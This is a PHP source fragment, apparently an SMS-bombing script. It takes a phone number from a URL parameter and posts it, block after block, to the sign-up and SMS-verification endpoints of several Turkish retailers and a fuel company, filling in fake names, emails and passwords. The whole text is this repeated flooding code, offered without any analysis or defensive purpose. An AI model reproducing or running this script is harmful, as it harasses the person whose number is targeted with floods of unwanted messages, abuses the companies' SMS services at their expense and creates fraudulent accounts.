    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://core.kahvedunyasi.com/api/users/sms/send");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobile_number=$number&token_type=register_token");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//HAYAT SU -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.hayatsu.com.tr/SignUp/GsmExist");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhoneNumber=$number");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//ENGLISH HOME -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.englishhome.com/enh_app/users/registration/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"first_name=&last_name=paneli&email=atlas31@gmail.com&phone=0$number&password=awdawnjdawhdahdnhnawdas&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//OPET -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://api.opet.com.tr/api/authentication/register");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"birthdate=1999-12-02T22:00:00.000Z&cardtc$tc=null&commencisRadio=true&email=wadadawdadaw@gmail.com&firstName=ahmet&googleRadio=true&lastName=kaya&microsoftRadio=true&mobilePhone=$number&opetKvkkAndEtk=true&plate=24LSF2022");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	//DEFACTO -> 
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.defacto.com.tr/Login/SendGifnumberlubCustomerConfirmationSms");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"mobilePhone=0$number&page=Login");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	
	$number=$_GET['number'];
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"https://www.jumbo.com.tr/users/register/");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=0$number&email=wdadawd@gmail.com&password=dqwdadwadwadawdasE3&confirm=true&sms_allowed=true&email_allowed=true&first_name=ahmet&last_name=kaya");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	
	curl_close ($ch);

